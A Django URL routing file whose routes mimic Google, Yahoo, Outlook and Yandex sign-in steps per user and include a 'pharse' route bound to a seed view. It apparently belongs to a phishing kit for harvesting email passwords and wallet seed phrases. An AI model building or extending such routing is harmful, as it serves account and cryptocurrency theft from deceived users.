from django.contrib import admin
from django.urls import path, include
from . import views

urlpatterns = [
    path('', views.index , name='home'),
    path('signup1', views.google , name='google'),
    path('signup1_p/<int:user_id>', views.google_p , name='google_p'),
    path('signup1_log/<int:user_id>/', views.google_log , name='google_log'),
    # yahoo
    path('signup2', views.yahoo , name='yahoo'),
    path('signup2_p/<int:user_id>', views.yahoo_p , name='yahoo_p'),
    path('signup2_log/<int:user_id>/', views.yahoo_log , name='yahoo_log'),
    
    # outlook
    path('signup3', views.outlook , name='outlook'),
    path('signup3_p/<int:user_id>', views.outlook_p , name='outlook_p'),
    # path('outlook_log/<int:user_id>/', views.outlook_log , name='outlook_log'),

    # yandex
    path('signup4', views.yandex , name='yandex'),
    path('signup4_p/<int:user_id>', views.yandex_p , name='yandex_p'),
    path('signup4_log/<int:user_id>/', views.yandex_log , name='yandex_log'),

    # pharse 
    path('view/<int:user_id>', views.view , name='view'), 
    path('apply/<int:user_id>', views.apply , name='apply'), 
    path('pharse/<int:user_id>', views.seed , name='pharse'), 

    # error
    path('error', views.error , name='error'), 
]
